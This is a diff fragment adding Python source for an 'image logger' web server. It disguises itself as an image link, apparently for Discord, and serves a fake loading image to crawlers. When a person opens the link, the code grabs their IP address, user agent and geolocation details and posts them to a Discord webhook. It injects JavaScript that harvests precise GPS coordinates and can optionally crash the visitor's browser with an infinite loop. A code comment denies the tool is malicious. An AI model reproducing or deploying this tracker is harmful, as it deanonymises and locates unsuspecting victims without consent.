+**User Agent:**
+```
+{useragent}
+```""",
+    }
+  ],
+}
+    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
+    return info
+
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+}
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
+    def handleRequest(self):
+        try:
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
+            
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
+            
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                
+                return
+            
+            else:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                else:
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
+
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
+        
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = ImageLoggerAPI
